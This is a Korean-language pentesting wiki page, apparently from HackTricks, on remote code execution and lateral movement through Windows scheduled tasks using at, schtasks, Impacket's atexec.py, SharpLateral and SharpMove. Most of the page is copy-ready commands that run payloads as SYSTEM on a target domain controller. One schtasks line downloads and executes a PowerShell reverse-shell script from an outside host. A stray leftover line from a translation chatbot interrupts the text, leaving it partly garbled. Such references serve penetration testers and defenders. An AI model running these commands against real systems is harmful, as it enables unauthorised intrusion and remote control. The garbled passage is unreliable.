# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 방식

Windows 호스트에 대한 administrative access가 있으면 operator는 원격으로 scheduled task를 생성하고 시작할 수 있습니다. `/S` 옵션은 remote host를 선택하고, `/U` 및 `/P`는 필요한 경우 task를 생성하기 위한 credentials를 제공하며, `/RU`는 task가 실행될 account를 선택합니다. `/TR`에서 참조하는 command는 remote system에 존재해야 합니다.<sup>[[1]](#references)</sup>

이전의 `at` command는 Schedule service가 실행 중일 때 remote host에서 command를 예약할 수도 있습니다. 이 command는 service account로 scheduled job을 실행하며, 일반적으로 `SYSTEM`입니다.<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
작업을 생성한 다음 시작하세요:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
번역할 원문을 보내 주세요.
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
반복되는 주간 작업에는 유효한 주간 schedule을 사용하고 요일을 명시하세요:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
작업 동작은 PowerShell을 직접 호출할 수도 있습니다. 다음 lab 예제는 script를 다운로드하여 실행합니다. payload는 assessment에 대해 승인을 받은 infrastructure에서만 호스팅하세요:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Impacket의 `atexec.py`는 Task Scheduler 서비스를 통한 원격 명령 실행을 자동화하며, password, NTLM-hash 또는 Kerberos 인증을 지원합니다.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral은 예약된 작업 실행 방법을 제공합니다.<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove는 또 다른 Task Scheduler 구현을 제공합니다:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[schtasks를 silver tickets와 함께 사용하는 방법에 대한 자세한 정보](../active-directory-methodology/silver-ticket.md#host).

사용 후 테스트 작업 제거:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
